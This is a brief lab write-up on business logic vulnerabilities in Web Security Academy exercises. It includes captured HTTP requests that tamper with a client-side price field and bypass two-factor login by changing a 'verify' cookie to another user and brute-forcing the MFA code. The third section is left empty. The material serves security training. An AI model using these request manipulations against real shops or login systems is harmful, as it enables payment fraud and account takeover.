# Title: Business Logic vulnerability's , *Web Academy*
- 👨‍💻By: Nathan Hailu
- 🗒Description: Labs are solved and their write up is here.
- 📅Date:  Fri 12/16/2022

================= { START } ==============================
A) Excessive trust in client-side controls
    When you order a products sites might include the amount of money inside the header as the following.
        POST /cart HTTP/1.1
        Host: 0a7600820378f9bac391207200d40016.web-security-academy.net
        Cookie: session=Ob6eiiqmMCuwttVCCRjagQEsg1US9tzR
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
        Connection: close

        productId=1&redir=PRODUCT&quantity=1&price=133700

        > Here we test the site by changing the price value to other and test if it works

B) 2FA broken logic
    Still looking into the header you can see that the site is validating the user by a cookie name called verify so changing the value there and trying to bruteforce the pin you can bypass it
        POST /login2 HTTP/1.1
        Host: 0aff00e303b87fdcc03c27c100a000fb.web-security-academy.net
        Cookie: session=liecaxPnaznrk54MItecLSRlMcNsz1g0; verify=carlos
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
        Connection: close

        mfa-code=1829

C) 